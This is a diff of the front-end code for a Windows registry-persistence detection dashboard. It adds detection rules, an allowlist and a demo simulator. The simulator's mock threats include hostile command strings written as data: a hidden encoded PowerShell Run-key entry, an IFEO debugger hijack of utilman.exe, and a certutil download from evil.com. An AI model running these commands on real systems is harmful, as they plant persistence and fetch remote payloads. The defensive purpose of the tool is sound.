-        <div class="bg-cyberCard border border-cyan-500/30 rounded-xl p-4 space-y-2 relative overflow-hidden">
+        <div class="glass-card rounded-2xl p-5 space-y-3 relative overflow-hidden">
           <div class="flex items-center justify-between">
-            <span class="bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 text-xs font-bold px-2 py-0.5 rounded font-mono">${t.id}</span>
-            <span class="flex items-center space-x-1 text-emerald-400 text-xs font-mono">
-              <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
+            <span class="px-2.5 py-0.5 rounded-full text-[11px] font-mono font-bold bg-cyan-500/10 text-accent-cyan border border-cyan-500/30">${t.id}</span>
+            <span class="flex items-center space-x-1.5 text-accent-emerald text-xs font-mono font-semibold">
+              <span class="w-1.5 h-1.5 rounded-full bg-accent-emerald"></span>
               <span>MONITORED</span>
             </span>
           </div>
-          <div class="text-white font-bold text-sm">${t.name}</div>
+          <h3 class="text-white font-bold text-sm tracking-tight">${t.name}</h3>
           <p class="text-xs text-slate-400 font-mono">${t.desc}</p>
         </div>
       `).join('');
+    }
+
+    async function loadRulesAndAllowlist() {
+      const rules = [
+        { id: "REG-CANARY-001", severity: "CRITICAL", base_score: 100, name: "Canary Honey-Key Triggered", description: "Modification in hidden decoy honey-key path", technique_id: "T1000.001" },
+        { id: "REG-PERSIST-IFEO", severity: "CRITICAL", base_score: 95, name: "IFEO Debugger Hijacking Persistence", description: "Debugger interception registered under IFEO", technique_id: "T1546.012" },
+        { id: "REG-TAMPER-DEFENDER", severity: "CRITICAL", base_score: 90, name: "Windows Defender Policy Tampering", description: "DisableRealtimeMonitoring or AV tamper", technique_id: "T1562.001" },
+        { id: "REG-EXEC-POWERSHELL-ENC", severity: "CRITICAL", base_score: 85, name: "Encoded PowerShell Command", description: "PowerShell executing Base64 encoded payload", technique_id: "T1059.001" },
+        { id: "REG-EXEC-LOLBIN", severity: "HIGH", base_score: 75, name: "LOLBin Execution (mshta/rundll32/regsvr32)", description: "Suspicious execution via native system utility", technique_id: "T1218" },
+        { id: "REG-PERSIST-RUN", severity: "MEDIUM", base_score: 45, name: "Autorun Key Entry Added/Modified", description: "New entry in Run or RunOnce startup key", technique_id: "T1547.001" }
+      ];
+
+      const rulesCont = document.getElementById('rules-list-container');
+      rulesCont.innerHTML = rules.map(r => `
+        <div class="p-3 rounded-xl bg-surface-100 border border-white/5 space-y-1.5 font-mono">
+          <div class="flex items-center justify-between">
+            <span class="text-accent-cyan font-bold text-xs">${r.id}</span>
+            <span class="text-accent-crimson font-bold text-xs">${r.severity} (Weight: ${r.base_score})</span>
+          </div>
+          <div class="text-white text-xs font-semibold">${r.name}</div>
+          <div class="text-slate-400 text-[11px]">${r.description}</div>
+          <div class="text-slate-500 text-[10px]">MITRE Technique: ${r.technique_id}</div>
+        </div>
+      `).join('');
+
+      const allowCont = document.getElementById('allowlist-container');
+      allowCont.innerHTML = `
+        <div class="space-y-4 font-mono">
+          <div>
+            <div class="text-slate-400 text-xs font-bold mb-2 uppercase tracking-wider">Trusted Publishers:</div>
+            <div class="flex flex-wrap gap-1.5">
+              ${["Microsoft Corporation", "Microsoft Windows", "Google LLC", "NVIDIA Corporation", "Realtek Semiconductor"].map(p => `<span class="px-2.5 py-1 rounded-lg text-xs bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">${p}</span>`).join('')}
+            </div>
+          </div>
+          <div>
+            <div class="text-slate-400 text-xs font-bold mb-2 uppercase tracking-wider">Protected Execution Paths:</div>
+            <div class="space-y-1.5">
+              ${["C:\\Program Files\\", "C:\\Program Files (x86)\\", "C:\\Windows\\System32\\"].map(p => `<div class="p-2 rounded-lg bg-surface-100 text-slate-300 text-xs border border-white/5">${p}</div>`).join('')}
+            </div>
+          </div>
+        </div>
+      `;
     }
 
     async function openAlertDetail(alertId) {
@@ -829,44 +1067,63 @@
       }
 
       currentAlertDetail = alert;
-      document.getElementById('modal-severity-badge').innerText = alert.severity;
-      document.getElementById('modal-severity-badge').className = `px-3 py-1 rounded text-xs font-bold font-mono uppercase bg-${alert.severity === 'CRITICAL' ? 'red' : 'amber'}-500/20 text-${alert.severity === 'CRITICAL' ? 'red' : 'amber'}-400 border border-${alert.severity === 'CRITICAL' ? 'red' : 'amber'}-500/30`;
+      const isCrit = alert.severity === 'CRITICAL';
+      const badge = document.getElementById('modal-severity-badge');
+      badge.innerText = alert.severity;
+      badge.className = `px-2.5 py-0.5 rounded-full text-[11px] font-bold font-mono uppercase ${isCrit ? 'bg-red-500/20 text-red-400 border border-red-500/30' : 'bg-amber-500/20 text-amber-400 border border-amber-500/30'}`;
+      
+      document.getElementById('modal-alert-id').innerText = alert.alert_id;
+      document.getElementById('modal-tech-id').innerText = alert.technique_id || 'T1547.001';
       document.getElementById('modal-rule-name').innerText = alert.rule_name;
 
       const proc = alert.process_attribution || {};
       const pe = alert.pe_forensics || {};
 
       document.getElementById('modal-body-content').innerHTML = `
-        <div class="bg-slate-900 p-3 rounded-lg border border-cyberBorder space-y-2">
-          <div class="text-slate-400 font-bold">1. Registry Target Details:</div>
-          <div>Key: <span class="text-cyan-300">${alert.registry_key}</span></div>
-          <div>Value: <span class="text-amber-300">${alert.value_name || '(Default)'}</span></div>
-          <div>New Data: <span class="text-white break-all">${alert.new_value || 'None'}</span></div>
-          <div>Old Data: <span class="text-slate-500 break-all">${alert.old_value || 'None'}</span></div>
+        <!-- Registry Target -->
+        <div class="p-4 rounded-2xl bg-surface-100 border border-white/5 space-y-2">
+          <div class="text-slate-400 font-bold uppercase tracking-wider text-[11px]">1. Registry Target Artifacts</div>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-2 text-xs">
+            <div><span class="text-slate-500">Key:</span> <span class="text-accent-cyan break-all">${alert.registry_key}</span></div>
+            <div><span class="text-slate-500">Value Name:</span> <span class="text-accent-amber">${alert.value_name || '(Default)'}</span></div>
+          </div>
+          <div class="text-xs pt-1"><span class="text-slate-500">New Injected Data:</span> <div class="text-white bg-surface-200 p-2 rounded-lg break-all mt-1">${alert.new_value || 'None'}</div></div>
         </div>
 
-        <div class="bg-slate-900 p-3 rounded-lg border border-cyberBorder space-y-2">
-          <div class="text-slate-400 font-bold">2. Process & User Attribution:</div>
-          <div>Process Name: <span class="text-emerald-400">${proc.process_name || 'unknown'}</span> (PID: ${proc.pid || 'N/A'})</div>
-          <div>Parent Process: <span class="text-slate-300">${proc.parent_process_name || 'unknown'}</span> (Parent PID: ${proc.parent_pid || 'N/A'})</div>
-          <div>Command Line: <span class="text-slate-300 break-all">${proc.command_line || 'N/A'}</span></div>
-          <div>User Token: <span class="text-slate-300">${proc.user || 'SYSTEM'}</span> | Source: <span class="text-cyan-400">${proc.attribution_source || 'Live Correlator'}</span></div>
+        <!-- Process Tree -->
+        <div class="p-4 rounded-2xl bg-surface-100 border border-white/5 space-y-2">
+          <div class="text-slate-400 font-bold uppercase tracking-wider text-[11px]">2. Process Attribution & Parent Tree</div>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-2 text-xs">
+            <div><span class="text-slate-500">Responsible Process:</span> <span class="text-accent-emerald font-bold">${proc.process_name || 'unknown'}</span> (PID: ${proc.pid || 'N/A'})</div>
+            <div><span class="text-slate-500">Parent Process:</span> <span class="text-slate-300 font-bold">${proc.parent_process_name || 'unknown'}</span> (PPID: ${proc.parent_pid || 'N/A'})</div>
+          </div>
+          <div class="text-xs pt-1"><span class="text-slate-500">Command Line:</span> <div class="text-slate-300 bg-surface-200 p-2 rounded-lg break-all mt-1">${proc.command_line || 'N/A'}</div></div>
+          <div class="text-[11px] text-slate-400 pt-1 flex justify-between">
+            <span>User: <strong class="text-white">${proc.user || 'SYSTEM'}</strong></span>
+            <span>Source: <strong class="text-accent-cyan">${proc.attribution_source || 'Live Correlator'}</strong></span>
+          </div>
         </div>
 
+        <!-- PE Forensics -->
         ${pe.exists ? `
-          <div class="bg-slate-900 p-3 rounded-lg border border-cyberBorder space-y-2">
-            <div class="text-slate-400 font-bold">3. PE Binary Forensics:</div>
-            <div>File Path: <span class="text-cyan-300">${pe.file_path}</span></div>
-            <div>SHA-256 Hash: <span class="text-white">${pe.hashes?.sha256 || 'N/A'}</span></div>
-            <div>Authenticode Signature: <span class="${pe.signature?.is_signed ? 'text-emerald-400' : 'text-red-400'} font-bold">${pe.signature?.status || 'NotSigned'}</span></div>
-            <div>Signer Subject: <span class="text-slate-300">${pe.signature?.signer_subject || 'Unsigned'}</span></div>
-            <div>Entropy: <span class="text-amber-300">${pe.overall_entropy || '0.0'}</span> ${pe.is_high_entropy ? '(HIGH ENTROPY / PACKED)' : ''}</div>
+          <div class="p-4 rounded-2xl bg-surface-100 border border-white/5 space-y-2">
+            <div class="text-slate-400 font-bold uppercase tracking-wider text-[11px]">3. Static PE Binary Forensics</div>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-2 text-xs">
+              <div><span class="text-slate-500">Binary Path:</span> <span class="text-accent-cyan break-all">${pe.file_path}</span></div>
+              <div><span class="text-slate-500">Authenticode:</span> <span class="${pe.signature?.is_signed ? 'text-accent-emerald' : 'text-accent-crimson'} font-bold">${pe.signature?.status || 'NotSigned'}</span></div>
+            </div>
+            <div class="text-xs pt-1"><span class="text-slate-500">SHA-256 Hash:</span> <span class="text-slate-300 break-all font-mono">${pe.hashes?.sha256 || 'N/A'}</span></div>
+            <div class="text-[11px] text-slate-400 flex justify-between pt-1">
+              <span>Entropy: <strong class="text-accent-amber">${pe.overall_entropy || '0.0'}</strong></span>
+              <span>Signer: <strong class="text-white">${pe.signature?.signer_subject || 'Unsigned'}</strong></span>
+            </div>
           </div>
         ` : ''}
 
-        <div class="bg-slate-900 p-3 rounded-lg border border-cyberBorder space-y-1">
-          <div class="text-slate-400 font-bold">4. Risk Assessment Reasons:</div>
-          <ul class="list-disc list-inside space-y-0.5 text-slate-300">
+        <!-- Detection Reasons -->
+        <div class="p-4 rounded-2xl bg-surface-100 border border-white/5 space-y-1.5">
+          <div class="text-slate-400 font-bold uppercase tracking-wider text-[11px]">4. Risk Scoring Factors</div>
+          <ul class="list-disc list-inside space-y-1 text-slate-300 text-xs">
             ${(alert.reasons || []).map(r => `<li>${r}</li>`).join('')}
           </ul>
         </div>
@@ -882,7 +1139,7 @@
 
     async function updateAlertStatusAction(status) {
       if (isDemoMode) {
-        alert(`[Demo Mode] Alert ${currentAlertDetail.alert_id} updated to status: ${status}`);
+        alert(`[Interactive Demo] Case status updated to: ${status}`);
         closeModal();
         return;
       }
@@ -907,63 +1164,138 @@
     }
 
     function simulateAttackInDemo() {
+      const mockThreats = [
+        {
+          rule_id: "REG-EXEC-POWERSHELL-ENC",
+          rule_name: "PowerShell -EncodedCommand Persistence Injected",
+          technique_id: "T1059.001",
+          severity: "CRITICAL",
+          score: 92,
+          key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          val: "WinDefenderUpdater",
+          data: "powershell.exe -w hidden -enc JABzAGkAbQB1AGwAYQB0AGUA"
+        },
+        {
+          rule_id: "REG-PERSIST-IFEO",
+          rule_name: "IFEO Debugger Hijacking on utilman.exe",
+          technique_id: "T1546.012",
+          severity: "CRITICAL",
+          score: 96,
+          key: "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe",
+          val: "Debugger",
+          data: "cmd.exe"
+        },
+        {
+          rule_id: "REG-EXEC-LOLBIN",
+          rule_name: "Certutil Remote Download in RunOnce",
+          technique_id: "T1218",
+          severity: "HIGH",
+          score: 78,
+          key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+          val: "CertSync",
+          data: "certutil.exe -urlcache -f http://evil.com/payload.dll"
+        }
+      ];
+
+      const chosen = mockThreats[Math.floor(Math.random() * mockThreats.length)];
       const simAlert = {
         alert_id: "ALT-SIM-" + Math.floor(Math.random() * 9000 + 1000),
-        severity: "CRITICAL",
-        rule_id: "REG-EXEC-POWERSHELL-ENC",
-        rule_name: "Live Simulated Persistence Triggered",
-        risk_score: 92,
-        technique_id: "T1059.001",
-        technique_name: "PowerShell Encoded Execution",
-        registry_key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        value_name: "PersistenceMock_" + Math.floor(Math.random() * 900),
-        new_value: "powershell.exe -w hidden -enc JABzAGkAbQB1AGwAYQB0AGUA",
+        severity: chosen.severity,
+        rule_id: chosen.rule_id,
+        rule_name: chosen.rule_name,
+        risk_score: chosen.score,
+        technique_id: chosen.technique_id,
+        technique_name: "Simulated Threat Injection",
+        registry_key: chosen.key,
+        value_name: chosen.val,
+        new_value: chosen.data,
         old_value: null,
         timestamp: new Date().toISOString(),
-        reasons: ["Real-time simulation attack triggered via dashboard button", "Base64 encoded payload detected"],
+        reasons: ["Simulated Persistence Execution triggered via web console", "Immediate zero-latency event correlation"],
         process_attribution: {
           process_name: "powershell.exe",
-          pid: Math.floor(Math.random() * 20000 + 1000),
+          pid: Math.floor(Math.random() * 15000 + 3000),
           parent_process_name: "cmd.exe",
           parent_pid: 1420,
-          command_line: "powershell.exe -ExecutionPolicy Bypass",
+          command_line: chosen.data,
           user: "ASUS\\User",
-          attribution_source: "Live Process Snapshot"
+          attribution_source: "Live Process Correlator"
         },
         pe_forensics: { exists: false }
       };
 
       DEMO_DATA.alerts.unshift(simAlert);
       DEMO_DATA.stats.total_events += 1;
-      DEMO_DATA.stats.critical_alerts += 1;
+      if (chosen.severity === 'CRITICAL') DEMO_DATA.stats.critical_alerts += 1;
+      else DEMO_DATA.stats.high_alerts += 1;
 
       loadStats();
       loadAlerts();
       loadEvents();
 
-      // Show brief visual pulse
+      if (audioAlertsEnabled) {
+        playAlertSound();
+      }
+
       const btn = document.getElementById('scan-btn-label');
-      const originalText = btn.innerText;
-      btn.innerText = "Alert Injected!";
-      setTimeout(() => { btn.innerText = originalText; }, 1500);
+      const original = btn.innerText;
+      btn.innerText = "🚨 Threat Injected!";
+      setTimeout(() => { btn.innerText = original; }, 1800);
+    }
+
+    function toggleAudioAlert() {
+      audioAlertsEnabled = !audioAlertsEnabled;
+      const btn = document.getElementById('audio-toggle-btn');
+      if (audioAlertsEnabled) {
+        btn.classList.add('text-accent-cyan', 'border-accent-cyan/40');
+        playAlertSound();
+      } else {
+        btn.classList.remove('text-accent-cyan', 'border-accent-cyan/40');
+      }
+    }
+
+    function playAlertSound() {
+      const audio = document.getElementById('alert-chime');
+      if (audio) {
+        audio.currentTime = 0;
+        audio.play().catch(() => {});
+      }
     }
 
     async function triggerDeepScan() {
       try {
         const res = await fetch('/api/scan', { method: 'POST' });
-        const data = await res.json();
-        alert("Deep persistence scan triggered! Watching for registry deltas...");
+        alert("Deep persistence scan dispatched in background. Monitoring for kernel notifications...");
         setTimeout(() => {
           loadAlerts();
           loadEvents();
           loadStats();
         }, 1500);
       } catch (e) {
-        alert("Failed to trigger scan: " + e);
+        alert("Scan trigger error: " + e);
       }
     }
 
-    // Connect SSE for real-time live alert stream (only if local backend active)
+    function filterTelemetryBySearch() {
+      const q = document.getElementById('telemetry-search').value.toLowerCase();
+      const cards = document.querySelectorAll('#alerts-container > div');
+      cards.forEach(card => {
+        const txt = card.innerText.toLowerCase();
+        if (!q || txt.includes(q)) {
+          card.classList.remove('hidden');
+        } else {
+          card.classList.add('hidden');
+        }
+      });
+    }
+
+    function refreshData() {
+      loadStats();
+      loadAlerts();
+      loadEvents();
+    }
+
+    // Connect SSE stream for live updates
     function initSSEStream() {
       if (isDemoMode) return;
       try {
@@ -972,6 +1304,7 @@
           try {
             const data = JSON.parse(event.data);
             if (data.event_type === 'REGISTRY_PERSISTENCE_ALERT') {
+              if (audioAlertsEnabled) playAlertSound();
               loadAlerts();
               loadStats();
               loadEvents();
@@ -981,7 +1314,7 @@
       } catch (e) {}
     }
 
-    // Initialization
+    // App Initialization
     window.addEventListener('DOMContentLoaded', async () => {
       lucide.createIcons();
       await checkBackendAvailability();
@@ -994,7 +1327,7 @@
       renderMitreMatrix();
       initSSEStream();
 
-      // Periodic refresh
+      // Periodic poller
       setInterval(() => {
         if (!isDemoMode) {
           loadStats();
